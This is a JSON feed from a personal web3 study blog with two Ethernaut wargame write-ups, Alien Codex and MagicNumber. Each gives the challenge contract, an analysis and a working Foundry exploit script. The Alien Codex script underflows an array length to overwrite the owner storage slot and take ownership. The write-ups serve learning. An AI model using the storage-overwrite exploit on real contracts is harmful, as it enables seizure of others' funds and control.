{
    "version": "https://jsonfeed.org/version/1",
    "title": "0o3q",
    "home_page_url": "https://0o3q.github.io/",
    "feed_url": "https://0o3q.github.io/feed.json",
    "description": "studying web3",
    "icon": "https://0o3q.github.io/apple-touch-icon.png",
    "favicon": "https://0o3q.github.io/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "0o3q",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://0o3q.github.io/2025/06/02/aliencodex",
            "title": "[Ethernaut] 19.Alien Codex",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import \"../helpers/Ownable-05.sol\";contract AlienCodex is Ownable {    bool public contact;    bytes32[] public codex;    modifier contacted() {        assert(contact);        _;    }    function makeContact() public {        contact = true;    }    function record(bytes32 _content) public contacted {        codex.push(_content);    }    function retract() public contacted {        codex.length--;    }    function revise(uint256 i, bytes32 _content) public contacted {        codex[i] = _content;    }}When first analyzing the AlienCodex contract, the record(), retract(), and revise() functions are wrapped by the contacted() modifier.Therefore, we must call the makeContact() function first to set the contact variable to true.pragma solidity ^0.5.0;/** * @dev Contract module which provides a basic access control mechanism, where * there is an account (an owner) that can be granted exclusive access to * specific functions. * * This module is used through inheritance. It will make available the modifier * `onlyOwner`, which can be applied to your functions to restrict their use to * the owner. */contract Ownable {    address private _owner;    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);    /**     * @dev Initializes the contract setting the deployer as the initial owner.     */    constructor() internal {        _owner = msg.sender;    }    /**     * @dev Returns the address of the current owner.     */    function owner() public view returns (address) {        return _owner;    }    /**     * @dev Throws if called by any account other than the owner.     */    modifier onlyOwner() {        require(isOwner(), \"Ownable: caller is not the owner\");        _;    }    /**     * @dev Returns true if the caller is the current owner.     */    function isOwner() public view returns (bool) {        return msg.sender == _owner;    }    /**     * @dev Leaves the contract without owner. It will not be possible to call     * `onlyOwner` functions anymore. Can only be called by the current owner.     *     * &gt; Note: Renouncing ownership will leave the contract without an owner,     * thereby removing any functionality that is only available to the owner.     */    function renounceOwnership() public onlyOwner {        emit OwnershipTransferred(_owner, address(0));        _owner = address(0);    }    /**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     * Can only be called by the current owner.     */    function transferOwnership(address newOwner) public onlyOwner {        _transferOwnership(newOwner);    }    /**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     */    function _transferOwnership(address newOwner) internal {        require(newOwner != address(0), \"Ownable: new owner is the zero address\");        emit OwnershipTransferred(_owner, newOwner);        _owner = newOwner;    }}Next, this contract is an Ownable contract that the AlienCodex contract inherits from. We need to overwrite the _owner variable in this contract.According to the Solidity documentation, we find that the _owner variable in the Ownable contract is stored at a lower storage slot than the contact and codex variables in the AlienCodex contract.The _owner and contact variables are stored together in slot 0 because the combined size of these two variables does not exceed 32 bytes, and the codex variable is stored separately in slot 1.To understand how the dynamic bytes array codex stores its data, we can refer to the Solidity documentation:  üí° bytes¬†and¬†string¬†are encoded identically. In general, the encoding is similar to¬†bytes1[], in the sense that there is a slot for the array itself and a data area that is computed using a¬†keccak256¬†hash of that slot‚Äôs position. However, for short values (shorter than 32 bytes) the array elements are stored together with the length in the same slot.  In particular: if the data is at most¬†31¬†bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value¬†length¬†*¬†2. For byte arrays that store data which is¬†32¬†or more bytes long, the main slot¬†p¬†stores¬†length¬†*¬†2¬†+¬†1¬†and the data is stored as usual in¬†keccak256(p). This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).When we call the retract() function, the codex array‚Äôs length underflows from 0 to 2^256 - 1.After this underflow, we can overwrite any storage slot by using the revise() function.When the i argument is provided to revise(), the function computes keccak256(abi.encode(0x1)) + i.If we set this equal to 0, we can overwrite the _owner variable in slot 0.  üí° Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot¬†0Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.2;import \"forge-std/Script.sol\";interface AlienCodex {    function owner() external view returns (address);    function contact() external returns (bool);    function makeContact() external;    function record(bytes32 _content) external;    function retract() external;    function revise(uint256 i, bytes32 _content) external;}contract AlienCodexSol is Script{    AlienCodex public ac_ = AlienCodex(0x018c6FCDb0c6930b1B4Ac8B68a94f0862a358dA7);    function run() external {        vm.startBroadcast();                console.log(\"Before Owner: \", ac_.owner());        ac_.makeContact();        ac_.retract();        ac_.revise(~(uint256(keccak256(abi.encode(0x1)))) + 1, bytes32(uint256(uint160(vm.envAddress(\"MY_ADDRESS\")))));        console.log(\"After Owner: \", ac_.owner());        vm.stopBroadcast();    }}~uint256(keccak256(abi.encode(0x1))) + 1 represents the two‚Äôs complement of keccak256(abi.encode(0x1)).Therefore, when we use this value as the i argument in the revise() function, adding keccak256(abi.encode(0x1)) and ~uint256(keccak256(abi.encode(0x1))) + 1 results in 0.This allows us to attach the _owner variable in storage slot 0.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.5</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../helpers/Ownable-05.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">AlienCodex</span> <span class=\"k\">is</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">contact</span><span class=\"p\">;</span>    <span class=\"kt\">bytes32</span><span class=\"p\">[]</span> <span class=\"k\">public</span> <span class=\"n\">codex</span><span class=\"p\">;</span>    <span class=\"k\">modifier</span> <span class=\"n\">contacted</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">assert</span><span class=\"p\">(</span><span class=\"n\">contact</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">makeContact</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">contact</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">record</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_content</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contacted</span> <span class=\"p\">{</span>        <span class=\"n\">codex</span><span class=\"p\">.</span><span class=\"n\">push</span><span class=\"p\">(</span><span class=\"n\">_content</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">retract</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">contacted</span> <span class=\"p\">{</span>        <span class=\"n\">codex</span><span class=\"p\">.</span><span class=\"n\">length</span><span class=\"o\">--</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">revise</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"kt\">bytes32</span> <span class=\"n\">_content</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contacted</span> <span class=\"p\">{</span>        <span class=\"n\">codex</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">_content</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When first analyzing the AlienCodex contract, the <code class=\"language-plaintext highlighter-rouge\">record()</code>, <code class=\"language-plaintext highlighter-rouge\">retract()</code>, and <code class=\"language-plaintext highlighter-rouge\">revise()</code> functions are <strong>wrapped by</strong> the <code class=\"language-plaintext highlighter-rouge\">contacted()</code> modifier.</p><p>Therefore, we must call the <code class=\"language-plaintext highlighter-rouge\">makeContact()</code> function first to set the <code class=\"language-plaintext highlighter-rouge\">contact</code> variable to <code class=\"language-plaintext highlighter-rouge\">true</code>.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.5</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"cm\">/** * @dev Contract module which provides a basic access control mechanism, where * there is an account (an owner) that can be granted exclusive access to * specific functions. * * This module is used through inheritance. It will make available the modifier * `onlyOwner`, which can be applied to your functions to restrict their use to * the owner. */</span><span class=\"k\">contract</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">private</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"k\">event</span> <span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">indexed</span> <span class=\"n\">previousOwner</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"k\">indexed</span> <span class=\"n\">newOwner</span><span class=\"p\">);</span>    <span class=\"cm\">/**     * @dev Initializes the contract setting the deployer as the initial owner.     */</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"k\">internal</span> <span class=\"p\">{</span>        <span class=\"n\">_owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Returns the address of the current owner.     */</span>    <span class=\"k\">function</span> <span class=\"n\">owner</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Throws if called by any account other than the owner.     */</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">isOwner</span><span class=\"p\">(),</span> <span class=\"s\">\"Ownable: caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Returns true if the caller is the current owner.     */</span>    <span class=\"k\">function</span> <span class=\"n\">isOwner</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Leaves the contract without owner. It will not be possible to call     * `onlyOwner` functions anymore. Can only be called by the current owner.     *     * &gt; Note: Renouncing ownership will leave the contract without an owner,     * thereby removing any functionality that is only available to the owner.     */</span>    <span class=\"k\">function</span> <span class=\"n\">renounceOwnership</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">emit</span> <span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"n\">_owner</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">));</span>        <span class=\"n\">_owner</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     * Can only be called by the current owner.     */</span>    <span class=\"k\">function</span> <span class=\"n\">transferOwnership</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newOwner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">_transferOwnership</span><span class=\"p\">(</span><span class=\"n\">newOwner</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     */</span>    <span class=\"k\">function</span> <span class=\"n\">_transferOwnership</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newOwner</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">newOwner</span> <span class=\"o\">!=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"s\">\"Ownable: new owner is the zero address\"</span><span class=\"p\">);</span>        <span class=\"k\">emit</span> <span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"n\">_owner</span><span class=\"p\">,</span> <span class=\"n\">newOwner</span><span class=\"p\">);</span>        <span class=\"n\">_owner</span> <span class=\"o\">=</span> <span class=\"n\">newOwner</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Next, this contract is an <strong>Ownable</strong> contract that the AlienCodex contract inherits from. We need to overwrite the <code class=\"language-plaintext highlighter-rouge\">_owner</code> variable in this contract.</p><p>According to the <a href=\"https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#storage-layout\">Solidity documentation</a>, we find that the <code class=\"language-plaintext highlighter-rouge\">_owner</code> variable in the <strong>Ownable</strong> contract is stored at a lower storage slot than the <code class=\"language-plaintext highlighter-rouge\">contact</code> and <code class=\"language-plaintext highlighter-rouge\">codex</code> variables in the AlienCodex contract.</p><p>The <code class=\"language-plaintext highlighter-rouge\">_owner</code> and <code class=\"language-plaintext highlighter-rouge\">contact</code> variables are stored together in slot <code class=\"language-plaintext highlighter-rouge\">0</code> because the combined size of these two variables does not exceed 32 bytes, <strong>and</strong> the <code class=\"language-plaintext highlighter-rouge\">codex</code> variable is stored separately in slot <code class=\"language-plaintext highlighter-rouge\">1</code>.</p><p>To understand how the dynamic <code class=\"language-plaintext highlighter-rouge\">bytes</code> array <code class=\"language-plaintext highlighter-rouge\">codex</code> stores its data, we can refer to the <a href=\"https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#bytes-and-string\">Solidity documentation</a>:</p><blockquote>  <p>üí° <code class=\"language-plaintext highlighter-rouge\">bytes</code>¬†and¬†<code class=\"language-plaintext highlighter-rouge\">string</code>¬†are encoded identically. In general, the encoding is similar to¬†<code class=\"language-plaintext highlighter-rouge\">bytes1[]</code>, in the sense that there is a slot for the array itself and a data area that is computed using a¬†<code class=\"language-plaintext highlighter-rouge\">keccak256</code>¬†hash of that slot‚Äôs position. However, for short values (shorter than 32 bytes) the array elements are stored together with the length in the same slot.</p>  <p>In particular: if the data is at most¬†<code class=\"language-plaintext highlighter-rouge\">31</code>¬†bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value¬†<code class=\"language-plaintext highlighter-rouge\">length¬†*¬†2</code>. For byte arrays that store data which is¬†<code class=\"language-plaintext highlighter-rouge\">32</code>¬†or more bytes long, the main slot¬†<code class=\"language-plaintext highlighter-rouge\">p</code>¬†stores¬†<code class=\"language-plaintext highlighter-rouge\">length¬†*¬†2¬†+¬†1</code>¬†and the data is stored as usual in¬†<code class=\"language-plaintext highlighter-rouge\">keccak256(p)</code>. This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).</p></blockquote><p>When we call the <code class=\"language-plaintext highlighter-rouge\">retract()</code> function, the <code class=\"language-plaintext highlighter-rouge\">codex</code> array‚Äôs length underflows from <code class=\"language-plaintext highlighter-rouge\">0</code> to <code class=\"language-plaintext highlighter-rouge\">2^256 - 1</code>.</p><p>After this underflow, we can overwrite any storage slot by using the <code class=\"language-plaintext highlighter-rouge\">revise()</code> function.</p><p>When the <code class=\"language-plaintext highlighter-rouge\">i</code> argument is provided to <code class=\"language-plaintext highlighter-rouge\">revise()</code>, the function computes <code class=\"language-plaintext highlighter-rouge\">keccak256(abi.encode(0x1)) + i</code>.</p><p>If we set this equal to <code class=\"language-plaintext highlighter-rouge\">0</code>, we can overwrite the <code class=\"language-plaintext highlighter-rouge\">_owner</code> variable in slot <code class=\"language-plaintext highlighter-rouge\">0</code>.</p><blockquote>  <p>üí° Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot¬†<code class=\"language-plaintext highlighter-rouge\">0</code></p></blockquote><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">2</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">AlienCodex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">owner</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">contact</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">makeContact</span><span class=\"p\">()</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">record</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_content</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">retract</span><span class=\"p\">()</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">revise</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"kt\">bytes32</span> <span class=\"n\">_content</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">AlienCodexSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span><span class=\"p\">{</span>    <span class=\"n\">AlienCodex</span> <span class=\"k\">public</span> <span class=\"n\">ac_</span> <span class=\"o\">=</span> <span class=\"n\">AlienCodex</span><span class=\"p\">(</span><span class=\"mh\">0x018c6FCDb0c6930b1B4Ac8B68a94f0862a358dA7</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>                <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before Owner: \"</span><span class=\"p\">,</span> <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">makeContact</span><span class=\"p\">();</span>        <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">retract</span><span class=\"p\">();</span>        <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">revise</span><span class=\"p\">(</span><span class=\"o\">~</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"mh\">0x1</span><span class=\"p\">))))</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"kt\">bytes32</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)))));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After Owner: \"</span><span class=\"p\">,</span> <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">~uint256(keccak256(abi.encode(0x1))) + 1</code> represents the two‚Äôs complement of <code class=\"language-plaintext highlighter-rouge\">keccak256(abi.encode(0x1))</code>.</p><p>Therefore, when we use this value as the <code class=\"language-plaintext highlighter-rouge\">i</code> argument in the <code class=\"language-plaintext highlighter-rouge\">revise()</code> function, adding <code class=\"language-plaintext highlighter-rouge\">keccak256(abi.encode(0x1))</code> and <code class=\"language-plaintext highlighter-rouge\">~uint256(keccak256(abi.encode(0x1))) + 1</code> results in <code class=\"language-plaintext highlighter-rouge\">0</code>.</p><p>This allows us to attach the <code class=\"language-plaintext highlighter-rouge\">_owner</code> variable in storage slot <code class=\"language-plaintext highlighter-rouge\">0</code>.</p><p><img src=\"https://0o3q.github.io/images/2025-06-02-AlienCodex/result.png\" alt=\"image.png\" /></p>",
            "url": "https://0o3q.github.io/2025/06/02/aliencodex",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","bytes","dynamicArray","underflow","slot"],
            
            "date_published": "2025-06-02T00:00:00+09:00",
            "date_modified": "2025-06-02T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/05/18/magicnumber",
            "title": "[Ethernaut] 18.MagicNumber",
            "summary": null,
            "content_text": "AnalysisThe goal is  ¬†provide the Ethernaut with a¬†Solver// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MagicNum {    address public solver;    constructor() {}    function setSolver(address _solver) public {        solver = _solver;    }    /*    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____             __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___             ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__             ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___             ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________             _\\///////////\\\\\\//____/\\\\\\/___________             ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_             ___________\\///_____\\///////////////__    */}We respond to the whatIsTheMeaningOfLife() function with the right 32 byte number.The number 42 is suspected to be the magic value expected by whatIsTheMeaningOfLife().PUSH1 0x2a // Push 42(0x42) onto the stack =&gt; 602aPUSH1 0x00 // Push memory offset 0x00 =&gt; 6000MSTORE // MSTORE(0x00: offset, 0x2a: value) Store 42 at memory[0x00]=&gt; 52PUSH1 0x20 // Push size (32 bytes) =&gt; 6020PUSH1 0x00 // Push memory offset 0x00 =&gt; 6000RETURN // Return memory[0x00:0x20] =&gt; f3The bytecode 0x602a60005260206000f3  returns right 32 byte number:0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a when whatIsTheMeaningOfLife() function is called.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/MagicNumber.sol\";import \"forge-std/Script.sol\";contract Ex {    constructor() {        assembly {            mstore(0, 0x602a60005260206000f3)            return(0x16, 0x0a)        }    }}contract MagicNumberSol is Script {    MagicNum public mn_ = MagicNum(0x20416BDe7653DaC534a51C744D7f572Bfd22aC76);    function run() external {        vm.startBroadcast();        console.log(\"Before solver: \", mn_.solver());        Ex ex = new Ex();        mn_.setSolver(address(ex));        console.log(\"After solver: \", mn_.solver());        vm.stopBroadcast();    }}When the command mstore(0, 0x602a60005260206000f3) is executed, the memory state becomes:0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000602a60005260206000f3After that, return(0x16, 0x0a) is executed, returning only the last 10 bytes (the constructor code), which is:0x602a60005260206000f3",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>¬†provide the Ethernaut with a¬†<code class=\"language-plaintext highlighter-rouge\">Solver</code></li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">MagicNum</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">solver</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{}</span>    <span class=\"k\">function</span> <span class=\"n\">setSolver</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_solver</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">solver</span> <span class=\"o\">=</span> <span class=\"n\">_solver</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/*    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____             __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___             ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__             ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___             ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________             _\\///////////\\\\\\//____/\\\\\\/___________             ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_             ___________\\///_____\\///////////////__    */</span><span class=\"p\">}</span></code></pre></div></div><p>We respond to the <code class=\"language-plaintext highlighter-rouge\">whatIsTheMeaningOfLife()</code> function with the right 32 byte number.</p><p>The number <strong>42</strong> is suspected to be the magic value expected by <code class=\"language-plaintext highlighter-rouge\">whatIsTheMeaningOfLife()</code>.</p><div class=\"language-nasm highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nf\">PUSH1</span> <span class=\"mh\">0x2a</span> <span class=\"o\">//</span> <span class=\"nv\">Push</span> <span class=\"mi\">42</span><span class=\"p\">(</span><span class=\"mh\">0x42</span><span class=\"p\">)</span> <span class=\"nv\">onto</span> <span class=\"nv\">the</span> <span class=\"nv\">stack</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">602</span><span class=\"nv\">a</span><span class=\"nf\">PUSH1</span> <span class=\"mh\">0x00</span> <span class=\"o\">//</span> <span class=\"nv\">Push</span> <span class=\"nv\">memory</span> <span class=\"nv\">offset</span> <span class=\"mh\">0x00</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">6000</span><span class=\"nf\">MSTORE</span> <span class=\"o\">//</span> <span class=\"nv\">MSTORE</span><span class=\"p\">(</span><span class=\"mh\">0x00</span><span class=\"p\">:</span> <span class=\"nv\">offset</span><span class=\"p\">,</span> <span class=\"mh\">0x2a</span><span class=\"p\">:</span> <span class=\"nv\">value</span><span class=\"p\">)</span> <span class=\"nv\">Store</span> <span class=\"mi\">42</span> <span class=\"nv\">at</span> <span class=\"nv\">memory</span><span class=\"p\">[</span><span class=\"mh\">0x00</span><span class=\"p\">]</span><span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">52</span><span class=\"nf\">PUSH1</span> <span class=\"mh\">0x20</span> <span class=\"o\">//</span> <span class=\"nv\">Push</span> <span class=\"nb\">si</span><span class=\"nv\">ze</span> <span class=\"p\">(</span><span class=\"mi\">32</span> <span class=\"kt\">byte</span><span class=\"nv\">s</span><span class=\"p\">)</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">6020</span><span class=\"nf\">PUSH1</span> <span class=\"mh\">0x00</span> <span class=\"o\">//</span> <span class=\"nv\">Push</span> <span class=\"nv\">memory</span> <span class=\"nv\">offset</span> <span class=\"mh\">0x00</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">6000</span><span class=\"nf\">RETURN</span> <span class=\"o\">//</span> <span class=\"nv\">Return</span> <span class=\"nv\">memory</span><span class=\"p\">[</span><span class=\"mh\">0x00</span><span class=\"p\">:</span><span class=\"mh\">0x20</span><span class=\"p\">]</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"nv\">f3</span></code></pre></div></div><p>The <a href=\"https://www.evm.codes/\">bytecode</a> <code class=\"language-plaintext highlighter-rouge\">0x602a60005260206000f3</code>  returns right 32 byte number:</p><div class=\"language-nasm 